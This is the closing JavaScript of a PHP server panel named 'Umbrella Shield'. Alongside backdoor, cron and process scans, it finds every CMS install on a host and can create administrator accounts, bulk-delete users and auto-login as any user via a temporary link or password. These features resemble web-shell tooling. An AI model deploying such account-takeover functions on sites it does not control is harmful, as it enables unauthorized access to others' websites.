            var p = document.getElementById('wp-new-pass').value.trim();
            if (!u || !e || !p) { alert('All fields required'); return; }
            api('wp_add_user', { username: u, email: e, password: p, role: 'administrator' }, function (d) {
                if (d.ok === false) { alert(d.error); return; }
                alert('User created: ' + d.username + ' (ID ' + d.user_id + ')');
                document.getElementById('wp-new-user').value = '';
                document.getElementById('wp-new-email').value = '';
                document.getElementById('wp-new-pass').value = '';
                wpLoadUsers(wpPage);
            });
        }
        function wpBulkPreview() {
            var pat = document.getElementById('wp-bulk-pat').value.trim();
            var field = document.getElementById('wp-bulk-field').value;
            if (!pat) return;
            api('wp_bulk_delete', { pattern: pat, field: field, preview: '1' }, function (d) {
                document.getElementById('wp-bulk-result').innerHTML = '<span style="color:var(--orange)">Found: <b>' + d.count + '</b> users matching "' + d.pattern + '"</span>';
            });
        }
        function wpBulkDelete() {
            var pat = document.getElementById('wp-bulk-pat').value.trim();
            var field = document.getElementById('wp-bulk-field').value;
            if (!pat) return;
            api('wp_bulk_delete', { pattern: pat, field: field, preview: '1' }, function (d) {
                if (d.count === 0) { alert('No users match this pattern'); return; }
                if (!confirm('DELETE ' + d.count + ' users where ' + d.field + ' = "' + d.pattern + '"?\n\nThis CANNOT be undone!')) return;
                api('wp_bulk_delete', { pattern: pat, field: field }, function (d2) {
                    alert('Deleted: ' + d2.deleted + ' users');
                    document.getElementById('wp-bulk-result').innerHTML = '<span style="color:var(--g)">Deleted: ' + d2.deleted + ' users</span>';
                    wpLoadUsers(wpPage);
                });
            });
        }
        function scanAll() { log('Full scan...'); sProcs(); sFiles(); sBd(); sBashrc(); sCron(); sGs(); sWpDb(); }

        // ── CMS USERS ──────────────────────────────────────────────────
        var cmsPage = 1;
        var cmsCurrentType = '';
        var cmsCurrentRoot = '';

        function cmsDetect() {
            document.getElementById('cms-detect-status').textContent = 'Scanning...';
            document.getElementById('cms-instance-sel').style.display = 'none';
            document.getElementById('cms-type-badge').style.display = 'none';
            api('cms_users', { cms_action: 'detect' }, function(d) {
                if (d.ok === false) { document.getElementById('cms-detect-status').textContent = 'Error: ' + (d.error || 'unknown'); return; }
                if (!d.instances || d.instances.length === 0) {
                    document.getElementById('cms-detect-status').textContent = 'No CMS found. Try navigating to a domain first.';
                    return;
                }
                var sel = document.getElementById('cms-instance-sel');
                sel.innerHTML = '';
                d.instances.forEach(function(inst) {
                    var opt = document.createElement('option');
                    opt.value = inst.type + '|' + inst.root;
                    opt.textContent = inst.label;
                    sel.appendChild(opt);
                });
                document.getElementById('cms-detect-status').textContent = d.count + ' CMS instance(s) found:';
                sel.style.display = '';
                cmsOnInstanceChange();
            });
        }

        function cmsManualLoad() {
            var pathEl = document.getElementById('cms-manual-path');
            var typeEl = document.getElementById('cms-manual-type');
            var errEl = document.getElementById('cms-manual-err');
            var path = pathEl.value.trim();
            var type = typeEl.value;
            if (!path) { errEl.textContent = 'Paste path dulu'; errEl.style.display = ''; return; }
            errEl.style.display = 'none';
            if (type === 'auto') {
                api('cms_users', { cms_action: 'detect_path', cms_path: path }, function(d) {
                    if (d.ok === false || !d.type) {
                        errEl.textContent = d.error || 'CMS not found at this path';
                        errEl.style.display = '';
                        return;
                    }
                    errEl.style.display = 'none';
                    cmsCurrentType = d.type;
                    cmsCurrentRoot = d.root || path;
                    _cmsSetBadge(cmsCurrentType);
                    cmsLoadUsers(1);
                });
            } else {
                cmsCurrentType = type;
                cmsCurrentRoot = path;
                _cmsSetBadge(type);
                cmsLoadUsers(1);
            }
        }
        function _cmsSetBadge(type) {
            var badge = document.getElementById('cms-type-badge');
            badge.textContent = type.toUpperCase();
            badge.style.display = '';
            var colors = { wordpress: '#3b82f6', joomla: '#f59e0b', laravel: '#ef4444', opencart: '#10b981', drupal: '#6366f1', prestashop: '#ec4899' };
            badge.style.background = (colors[type] || '#6b7280') + '33';
            badge.style.color = colors[type] || '#9ca3af';
            document.getElementById('cms-filterbar').style.display = 'flex';
            document.getElementById('cms-addform').style.display = '';
        }
        function cmsOnInstanceChange() {
            var sel = document.getElementById('cms-instance-sel');
            var val = sel.value;
            if (!val) return;
            var parts = val.indexOf('|');
            cmsCurrentType = val.substring(0, parts);
            cmsCurrentRoot = val.substring(parts + 1);
            _cmsSetBadge(cmsCurrentType);
            cmsLoadUsers(1);
        }

        function cmsLoadUsers(page) {
            if (!cmsCurrentType || !cmsCurrentRoot) return;
            if (page < 1) return;
            cmsPage = page;
            var info = document.getElementById('cms-info');
            var table = document.getElementById('cms-table');
            var tb = document.getElementById('cms-tbody');
            info.textContent = 'Loading...'; info.style.display = ''; table.style.display = 'none';
            var cmsRole = document.getElementById('cms-role') ? document.getElementById('cms-role').value : 'administrator';
            api('cms_users', { cms_action: 'list', cms_type: cmsCurrentType, cms_root: cmsCurrentRoot, page: page, role: cmsRole }, function(d) {
                if (d.ok === false) { info.textContent = 'Error: ' + (d.error || 'DB error'); info.style.display = ''; table.style.display = 'none'; return; }
                document.getElementById('cms-pager').textContent = 'Page ' + d.page + '/' + d.total_pages + ' (' + d.total + ' users)';
                tb.innerHTML = '';
                if (!d.users || d.users.length === 0) { info.textContent = 'No users found'; info.style.display = ''; table.style.display = 'none'; return; }
                info.style.display = 'none'; table.style.display = '';
                d.users.forEach(function(u) {
                    var tr = E('tr');
                    if (u.flags && u.flags.length > 0) tr.style.background = 'rgba(239,68,68,0.05)';
                    // Checkbox
                    var tdCb = E('td'); var cb = document.createElement('input'); cb.type = 'checkbox'; cb.className = 'cms-cb'; cb.value = u.id;
                    if (u.id === 1) { cb.disabled = true; cb.title = 'Cannot delete primary admin'; }
                    cb.onchange = cmsUpdateSelCount; tdCb.appendChild(cb); tr.appendChild(tdCb);
                    // ID
                    var tdId = E('td'); tdId.textContent = u.id; tdId.style.fontFamily = 'monospace'; tr.appendChild(tdId);
                    // Login
                    var tdL = E('td'); tdL.style.fontWeight = '600';
                    tdL.textContent = u.login;
                    if (u.display_name && u.display_name !== u.login) {
                        var sub = E('div'); sub.style.cssText = 'font-size:10px;color:var(--t3);font-weight:400'; sub.textContent = u.display_name; tdL.appendChild(sub);
                    }
                    tr.appendChild(tdL);
                    // Email
                    var tdE = E('td'); tdE.textContent = u.email; tdE.style.fontSize = '11px'; tr.appendChild(tdE);
                    // Created
                    var tdC = E('td'); tdC.textContent = (u.created || '').substring(0, 10); tdC.style.cssText = 'font-size:11px;color:var(--t3)'; tr.appendChild(tdC);
                    // Roles
                    var tdR = E('td'); tdR.style.fontSize = '10px';
                    (u.roles || []).forEach(function(role) {
                        var sp = E('span'); sp.className = 'tag ' + (/admin|super|administrator/i.test(role) ? 'tag-d' : 'tag-y');
                        sp.textContent = role; sp.style.marginRight = '2px'; tdR.appendChild(sp);
                    }); tr.appendChild(tdR);
                    // Flags
                    var tdF = E('td'); tdF.style.fontSize = '10px';
                    var flagColors = { recent: ['rgba(255,159,10,0.2)','var(--orange)','NEW'], blocked: ['rgba(239,68,68,0.2)','var(--r)','BAN'], disabled: ['rgba(239,68,68,0.2)','var(--r)','OFF'], superadmin: ['rgba(239,68,68,0.2)','var(--r)','SU'] };
                    (u.flags || []).forEach(function(f) {
                        var fc = flagColors[f] || ['rgba(100,100,100,0.2)','var(--t3)',f.toUpperCase()];
                        var sp = E('span'); sp.style.cssText = 'display:inline-block;padding:1px 6px;border-radius:4px;margin-right:2px;font-size:9px;font-weight:600;background:' + fc[0] + ';color:' + fc[1];
                        sp.textContent = fc[2]; tdF.appendChild(sp);
                    }); tr.appendChild(tdF);
                    // Actions
                    var tdA = E('td'); tdA.style.cssText = 'display:flex;gap:3px;flex-wrap:wrap';
                    var lb = E('button'); lb.className = 'btn btn-s btn-ok'; lb.style.cssText = 'font-size:10px;padding:2px 8px'; lb.textContent = '🔑 Login';
                    lb.onclick = (function(uid) { return function() { cmsAutoLogin(uid); }; })(u.id);
                    tdA.appendChild(lb);
                    if (u.id > 1) {
                        var db2 = E('button'); db2.className = 'btn btn-s btn-d'; db2.style.cssText = 'font-size:10px;padding:2px 8px'; db2.textContent = '🗑';
                        db2.onclick = (function(uid, uname) { return function() {
                            if (confirm('Delete user ' + uname + ' (ID ' + uid + ')?')) {
                                api('cms_users', { cms_action: 'delete', cms_type: cmsCurrentType, cms_root: cmsCurrentRoot, user_ids: JSON.stringify([uid]) }, function() { cmsLoadUsers(cmsPage); });
                            }
                        }; })(u.id, u.login);
                        tdA.appendChild(db2);
                    }
                    tr.appendChild(tdA); tb.appendChild(tr);
                });
                document.getElementById('cms-selall').checked = false;
                document.getElementById('cms-del-sel').style.display = 'none';
                document.getElementById('cms-sel-count').style.display = 'none';
            });
        }

        function cmsAutoLogin(uid) {
            api('cms_users', { cms_action: 'autologin', cms_type: cmsCurrentType, cms_root: cmsCurrentRoot, user_id: uid }, function(d) {
                if (d.ok === false) { alert('Auto-login error: ' + (d.error || 'unknown')); return; }
                if (d.type === 'link') {
                    var msg = 'Auto-login URL (valid 120s, self-deletes):\n\n' + d.url;
                    if (d.note) msg += '\n\nℹ ' + d.note;
                    if (confirm(msg + '\n\nOpen in new tab?')) window.open(d.url, '_blank');
                } else if (d.type === 'password') {
                    var msg2 = '🔑 Temp password set!\n\nLogin URL: ' + d.login_url + '\nTemp Password: ' + d.temp_password + '\n\n⚠ ' + (d.note || 'Change password after login!');
                    prompt('Copy login details:', d.login_url + ' | ' + d.temp_password);
                    alert(msg2);
                }
            });
        }

        function cmsToggleAll(el) {
            document.querySelectorAll('.cms-cb:not(:disabled)').forEach(function(cb) { cb.checked = el.checked; });
            cmsUpdateSelCount();
        }
        function cmsUpdateSelCount() {
            var n = document.querySelectorAll('.cms-cb:checked').length;
            document.getElementById('cms-del-sel').style.display = n > 0 ? '' : 'none';
            document.getElementById('cms-sel-count').style.display = n > 0 ? '' : 'none';
            document.getElementById('cms-sel-count').textContent = n + ' selected';
        }
        function cmsDeleteSelected() {
            var ids = [];
            document.querySelectorAll('.cms-cb:checked').forEach(function(cb) { ids.push(parseInt(cb.value)); });
            if (ids.length === 0) return;
            if (!confirm('Delete ' + ids.length + ' user(s)?\n\nIDs: ' + ids.slice(0, 10).join(', ') + (ids.length > 10 ? '...' : '') + '\n\nThis CANNOT be undone!')) return;
            api('cms_users', { cms_action: 'delete', cms_type: cmsCurrentType, cms_root: cmsCurrentRoot, user_ids: JSON.stringify(ids) }, function(d) {
                if (d.ok === false) { alert('Delete error: ' + d.error); return; }
                alert('Deleted: ' + d.deleted + ' user(s)');
                cmsLoadUsers(cmsPage);
            });
        }
        function cmsAddUser() {
            var u = document.getElementById('cms-new-user').value.trim();
            var e = document.getElementById('cms-new-email').value.trim();
            var p = document.getElementById('cms-new-pass').value.trim();
            if (!u || !e || !p) { alert('All fields required'); return; }
            if (!cmsCurrentType || !cmsCurrentRoot) { alert('Select a CMS instance first'); return; }
            api('cms_users', { cms_action: 'add', cms_type: cmsCurrentType, cms_root: cmsCurrentRoot, username: u, email: e, password: p }, function(d) {
                if (d.ok === false) { document.getElementById('cms-add-result').innerHTML = '<span style="color:var(--r)">Error: ' + (d.error || 'unknown') + '</span>'; return; }
                document.getElementById('cms-add-result').innerHTML = '<span style="color:var(--g)">&#10003; Created: ' + (d.login || u) + ' (ID ' + d.user_id + ')</span>';
                document.getElementById('cms-new-user').value = '';
                document.getElementById('cms-new-email').value = '';
                document.getElementById('cms-new-pass').value = '';
                cmsLoadUsers(cmsPage);
            });
        }
        // Auto-check exec capability on load — tampilkan warning di dashboard jika terbatas
        api('exec_caps', {}, function (d) {
            if (!d.exec_works) {
                var warn = E('div');
                warn.style.cssText = 'background:#ff9f0a1a;border:1px solid #ff9f0a44;border-radius:8px;padding:10px 14px;margin-bottom:12px;font-size:12px';
                warn.innerHTML = '<span style="color:var(--orange);font-weight:600">⚠ exec() disabled</span> — '
                    + 'File scan/edit/delete masih berfungsi via PHP native. '
                    + 'Process kill & crontab butuh exec.<br>'
                    + '<span style="color:var(--t3);font-size:11px">disabled_functions: ' + d.disabled_fns + '</span>';
                var ds = document.getElementById('ds');
                if (ds) ds.parentNode.insertBefore(warn, ds);
                log('⚠ exec disabled — limited mode. ' + d.note);
            }
        });
        log('Umbrella Shield loaded');
    </script>
</body>

</html>
